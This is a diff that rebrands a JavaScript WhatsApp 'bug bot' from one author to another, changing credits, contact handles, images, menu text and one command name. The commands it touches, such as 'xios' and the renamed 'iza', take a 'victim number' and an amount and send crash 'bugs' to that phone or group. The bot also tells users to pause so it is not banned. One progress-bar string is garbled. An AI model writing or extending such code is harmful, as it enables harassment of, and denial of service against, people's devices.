@@ -1,12 +1,11 @@
-//base by Limule Solitarus 
+//base by Cytra_k9
 //re-upload? recode? copy code? give credit ya :)
-//YouTube: @Darklimule
-//Instagram: mikael_jordan
-//Telegram: t.me/darklimule
-//GitHub: @Limule3650
-//WhatsApp: +237693538738
-//want more free bot scripts? subscribe to my youtube channel: https://www.youtube.com/@Darklimule
-
+//YouTube: @Cytra_k9
+//Instagram: Cytra_k9
+//Telegram: t.me/Cytrak
+//GitHub: @CytraK
+//WhatsApp: +254715155196
+//want more free bot scripts? subscribe to my youtube channel: https://www.youtube.com/@Cytra_k9
 const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
 const os = require('os')
 const fs = require('fs') 
@@ -493,7 +492,7 @@ async function loading () {
 var xeonlod = [
 "ã€Š â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ã€‹10%",
 "ã€Š â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’ã€‹30%",
-"ã€Š â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€‹50%",
+"ã€Š â–ˆâ–ˆâ–g†!$++#)ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€‹50%",
 "ã€Š â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ã€‹80%",
 "ã€Š â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€‹100%",
 "ð™»ð™¾ð™°ð™³ð™¸ð™½ð™¶ ð™²ð™¾ð™¼ð™¿ð™»ð™´ðšƒð™´ð™³ ðŸ¦„..."
@@ -923,7 +922,7 @@ senddocu(buffer)
                                 showAdAttribution: true,
                                 title: 'Broadcast By Owner',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/39394d8ffdd7632cb1e5c.jpg/thumb.png',
+                                thumbnailUrl: 'https://telegra.ph/file/6238d670a279057951ba5.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -981,7 +980,7 @@ senddocu(buffer)
                 replygcxeon(`Close time ${q} starting from now`)
                 setTimeout(() => {
                     var nomor = m.participant
-                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
+                    const close = `*Closed* group closed by Cytra n\nnow only admin can send messages`
                     XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                     replygcxeon(close)
                 }, timer)
@@ -2111,11 +2110,11 @@ case "xandroid": {
 break;
 case "xios": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 237xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 254xxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 237xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 254..,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2124,7 +2123,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "237698581946") {
+  if (cleanedNumber == "254715155196") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2189,7 +2188,7 @@ case "xios2":
     }
     replygcxeon("please wait, " + command + " bug is in process..");
     if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return replygcxeon("Link Invalid!");
+      return replygcxeon("Link haijulikani!");
     }
     let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
     try {
@@ -2232,18 +2231,18 @@ case "xios2":
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
+    " Using *" + command + "* âœ…\n\nPause  1 minute so that the bot is not banned.", 
     [whatsappNumber]
   );
 }
 break;
-case "xsysui": {
+case "iza": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 237xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 254xxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 237xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 254xxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2252,7 +2251,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "237698581946") {
+  if (cleanedNumber == "254715155196") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2278,22 +2277,22 @@ case 'clearchat':
 xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 break
 case 'limulesolitarus':
-xeonimun('Love You 🤍 Dear \n Thanks For using My Bug 🐉 Bot \n\n *Do not Forget To support me by subscribe my channel* \n _Youtube Search DEATH RAPHAEL-BUG Thanks_ 🙏 😘')
+xeonimun('Love You ❤️❤️❤️❤️Dear \n Thanks For using My Bug 🐉 Bot \n\n *Do not Forget To support me by subscribe my channel* \n _Youtube Search Cytra_k9 Thanks_ 🙏 😘')
 break
             case 'menu':
             case 'help':
             case 'alive':
             case 'bot':
             case 'allmenu':
-                let xeonmenuoh =`╭──✪「DEATH RAPHAEL-BUG」✪
+                let xeonmenuoh =`╭──✪「CYTRA-MD」✪
 ├ User: ${pushname}
 ├ Greeting:${xeonytimewisher}
 ├ DATE: look your calendar 
-├ PLATFORM: LINUX
-├ TIME: you have a watch 
+├ PLATFORM: Cytra's panel
+├ TIME: you ve a watch 
 ╰─┬────────✪
 ╭─┴✪「 *YouTube Channel* 」✪
-├ https://www.youtube.com/@Darklimule
+├ https://www.youtube.com/@Cytra_k9
 ╰──────────✪
 
 ╭────✪ *Android Bug ⚠️* *✪⊷*
@@ -2301,7 +2300,7 @@ break
 ┋⍟┃ xandroid 
 ┋⍟┃ xandroid2
 ┋⍟┃ systemuicrash
-┋⍟┃ xsysui
+┋⍟┃ iza
 ┋⍟╰───────────────
 ╰═════════════════✪
 ╭────✪ *Ios Bug 🐉* *✪⊷*
@@ -2421,7 +2420,7 @@ break
 ┋⍟┃ sound1 - sound161
 ┋⍟╰───────────────
 ╰═════════════════✪
-> 2025© Limule Solitarus`
+> 2025© Cytra_k9`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         text: xeonmenuoh,
@@ -2429,7 +2428,7 @@ if (typemenu === 'v1') {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://telegra.ph/file/7c4fb86c9575d9c0f4357.jpg/thumb.png',
+                                thumbnailUrl: 'https://telegra.ph/file/6238d670a279057951ba5.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
